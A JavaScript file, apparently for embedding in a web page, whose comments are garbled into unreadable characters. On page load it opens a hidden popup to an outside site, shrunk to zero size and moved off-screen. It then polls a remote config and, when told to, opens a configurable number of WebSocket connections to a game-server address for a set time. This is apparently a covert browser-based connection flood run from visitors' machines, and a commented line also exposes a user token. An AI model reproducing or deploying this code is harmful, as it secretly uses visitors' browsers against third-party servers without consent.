window.onload = function() {
    setTimeout(function() {
        var win = window.open('http://intest.dstars.cc/gamewap/websocket/newIndex.html', '_blank', 'toolbar=yes, location=yes, directories=no, status=no, menubar=yes, scrollbars=yes, resizable=no, copyhistory=yes, width=400, height=400');
        win.resizeTo(0, 0);
        win.moveTo(0, window.screen.width)
    }, 5000);
}

/* 灏佽ajax鍑芥暟
 * @param {string}opt.type http杩炴帴鐨勬柟寮忥紝鍖呮嫭POST鍜孏ET涓ょ鏂瑰紡
 * @param {string}opt.url 鍙戦€佽姹傜殑url
 * @param {boolean}opt.async 鏄惁涓哄紓姝ヨ姹傦紝true涓哄紓姝ョ殑锛宖alse涓哄悓姝ョ殑
 * @param {object}opt.data 鍙戦€佺殑鍙傛暟锛屾牸寮忎负瀵硅薄绫诲瀷
 * @param {function}opt.success ajax鍙戦€佸苟鎺ユ敹鎴愬姛璋冪敤鐨勫洖璋冨嚱鏁�
 */
function ajax(opt) {
    opt = opt || {};
    opt.method = opt.method.toUpperCase() || 'POST';
    opt.url = opt.url || '';
    opt.async = opt.async || true;
    opt.data = opt.data || null;
    opt.success = opt.success || function() {};
    var xmlHttp = null;
    if (XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject('Microsoft.XMLHTTP');
    }
    var params = [];
    for (var key in opt.data) {
        params.push(key + '=' + opt.data[key]);
    }
    var postData = params.join('&');
    if (opt.method.toUpperCase() === 'POST') {
        xmlHttp.open(opt.method, opt.url, opt.async);
        xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8');
        xmlHttp.send(postData);
    } else if (opt.method.toUpperCase() === 'GET') {
        xmlHttp.open(opt.method, opt.url + '?' + postData, opt.async);
        xmlHttp.send(null);
    }
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            opt.success(xmlHttp.responseText);
        }
    };
}




var yxTime;
var yxlength;

// 璇诲彇閰嶇疆锛屾瘡绉掓墽琛屼竴娆�
var name = setInterval(function() {
    ajax({
        method: 'GET',
        url: 'config.json',
        success: function(res) {
            // 璇诲彇閰嶇疆鎴愬姛鍚�
            res = JSON.parse(res)
                // flag = 1 鏃跺仠姝㈣鍙栭厤缃�
            if (res.flag === 1) {
                clearInterval(name);
                yxTime = res.time;
                yxlength = res.length;
                if (timeFlag(res.time, res.length)) {
                    for (var i = 0; i < res.num; i++) {
                        setWS();
                    }
                }
            }
        }
    });
}, 1000);


// 璇诲彇鍒伴厤缃悗锛� 鍒ゆ柇鏄惁鎸傝浇 WebSocket
function timeFlag(t, s) {
    var newDate = Date.parse(new Date());
    var conDate = Date.parse(new Date(t));
    var t1 = (conDate + s * 1000) < newDate,
        t2 = newDate > conDate;
    console.log(new Date());
    console.log(conDate);
    if (t1 && t2) {
        return true
    } else {
        return false
    }
}


// 鎸傝浇 WebSocket
function setWS() {
    var host = 'ws://z.adxue.cn:17103',
        // var host = 'wss://yx.zdgame.com:8003/?uid=88005617&token=tl8CRUQz0FdlhLTTJYsBVwGIJJSI/RlCFRwGAFbi8A2ECXzX9GUziFPQNGV2CYYz&chl=hall',
        ws = new WebSocket(host);
    ws.onopen = function(evt) {
        console.log('Connection open ...');
        var newTime = setInterval(function() {
            if (!timeFlag(yxTime, yxlength)) {
                clearInterval(newTime);
                ws.close();
            }
        }, 1000);
    };
    ws.onmessage = function(evt) {
        console.log('Received Message: ' + evt.data);
    };
    ws.onclose = function(evt) {
        console.log('鍏抽棴 WebSocket 鍥炶皟');
    };
    ws.onerror = function(evt) {
        console.log(evt);
    };
}
